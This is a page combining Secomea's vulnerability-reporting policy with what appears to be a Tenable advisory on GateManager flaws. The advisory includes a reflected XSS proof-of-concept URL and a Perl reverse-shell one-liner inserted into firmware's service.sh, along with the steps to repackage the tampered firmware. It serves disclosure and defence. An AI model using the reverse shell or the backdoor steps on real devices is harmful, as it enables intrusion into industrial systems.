Secomea is a CISA-authorized CVE Numbering Authority (CNA)

# Cybersecurity advisory

## At Secomea, we are transparent and keep ourselves accountable for the security of our products and, in turn, your operations. If you have discovered what you suspect could be a security vulnerability in our products or services, please follow the process detailed below to report it.

### Cybersecurity Advisory Process

 Report

If you have discovered an issue that you believe is a security vulnerability in our products or services, please report it to us via email at vulnerabilityreporting@secomea.com.

Please include the following, as applicable:

* a detailed description of the vulnerability
* a Proof of Concept (POC) or instructions (e.g., screenshots, video, etc.) on how to reproduce the issue or steps taken when the issue occurred
* a risk or exploitability assessment
* instructions on how to reach you with follow-up questions
* information on whether the issue is subject to a Coordinated Vulnerability Disclosure (CVD) deadline.

A CVE assignment and discovery acknowledgment regarding reports on products no longer supported will be decided on a case-by-case basis.

We acknowledge that reporting can contain sensitive information. If so, please indicate in your email that you are sharing sensitive data with us, and we will arrange proper data protection measures. You can submit your report using our [PGP Public Key](https://www.secomea.com/wp-content/uploads/2022/10/PublicKey.pub_.zip).

 Analysis

Once reported, our support team will evaluate the issue to determine whether the report is a valid security vulnerability.

The support team will then contact the reporting entity with our analysis results. We strive to respond to all reports within three working days.

The reporter must respond within 30 days, or the case may be closed.

Partners or other CERTs are informed and involved in the process if necessary.

 Handling

If our support team assesses the issue reported as a security vulnerability, our R&D department will address it as product fixes (remediations or mitigations).

Secomea will keep the reporter informed of the status of the reported vulnerability and our approach to addressing it. If appropriate, a preview release can be provided to the reporter in advance for validation.

We strive to fix vulnerabilities with CVSS (CVSS version 3.1) scores above medium within 30 business days. Generally, CVEs with medium/high CVSS scores but with a low risk/impact evaluation may have a longer timeline than CVEs with high risk/impact evaluation.

For vulnerabilities with a CVSS score higher than 7.0, Secomea will review the Threat Model of affected products to ensure the best cybersecurity standards are in place.

 Disclosure

Secomea will release product fixes for vulnerabilities as part of standard product releases. Fixes are deployed to Secomea-hosted solutions as they become available. Secomea will disclose security advice as part of the release documentation.

All CVEs with a CVSS score of medium or higher will be published to the CVE list. The disclosure timeline of security advisories will be coordinated with customers, partners, and the reporter.

Our Security Advisory usually contains the following information:

* CVE reference, CVSS score, and description of the vulnerability, including risk/impact evaluation
* Available mitigations and workarounds
* Reference to the reporter (optionally)

 Third-party software vulnerabilities

Vulnerabilities in third-party software components used in supported Secomea products are assessed according to their risk and impact in relation to the product’s security context. Secomea may adjust the CVSS score to reflect such an impact.

Potential fixes will be released as part of standard Secomea product releases. Third-party vulnerabilities with assessed CVSS scores above medium will be disclosed in the release documentation.

# Secomea GateManager Multiple Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has discovered multiple vulnerabilities in the Secomea products. We have been advised by Secomea to "expect that these vulnerabilities affect all Secomea vendors." As we determine the list of affected vendors, we will update this page. To our current knowledge, this list includes B&R Industrial Automation GmbH.

### CVE-2020-29028: Reflected Cross-site Scripting

**CVSSv3 Base Score:** 6.1

**CVSSv3 Vector:** AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

The ‘op’ parameter on gui.cgi is reflected back in the response without sanitization. It is possible to inject arbitrary JavaScript code that will be executed in the user’s browser upon navigating to the crafted URL.

#### Proof of Concept

When the page is rendered at the below URL, javascript is executed resulting in the message ‘reflected xss’ being displayed.

```
https://192.168.0.186/lm/cgi/gui.cgi?op=<script>alert('reflected+xss')</script>&cert=local_ca.pem
```
![](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/secomea-xss-1_0.png)
### CVE-2020-29030: Authentication Token Exposed in URL Path

**CVSSv3 Base Score:** 8.1

**CVSSv3 Vector:** AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

Once authenticated to the Gatemanager the authentication token is, by default, exposed in all future POST/GET requests. This is dangerous as the URL path can be saved in the browser's history, passed through Referer headers to other websites, stored in web logs, or otherwise recorded in other sources. If the URL path contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.

#### Proof of Concept

In the below screenshot we can see that we can access restricted pages using only the authentication token appended to the path URL.

### CVE-2020-29032: Authenticated Malicious Firmware Upload

**CVSSv3 Base Score:** 8.3

**CVSSv3 Vector:** AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H

It is possible to upload a malicious firmware to the device. If a victim with service operator level permissions were tricked into uploading tampered firmware, a remote attacker could backdoor the device.

#### Proof of Concept

As a proof of concept I added the below perl reverse shell one-liner to the top of service.sh.

```
perl -e 'use Socket;$i="172.17.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

To do this I first extracted the update package which was a gzipped archive.

![](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/secomea-fw-1_0.png)

I then opened service.sh in a text editor and added the backdoor.

![](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/secomea-fw-2.png)

Then to repackage the firmware I ran the below command.

```
tar -zcvf Secomea_GateManager_Installer_v9.3.620453012.tgz .
```

Once uploaded this will result in a reverse shell being sent back to the attacker when the service is started.

![](https://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/secomea-fw-3.png)

Note: To reproduce this locally you will need to extract the contents of the firmware, modify the return IP address of the backdoor in service.sh and repack the firmware.

### Solution

Upgrade to 9.4. See additional references for specific guidance.
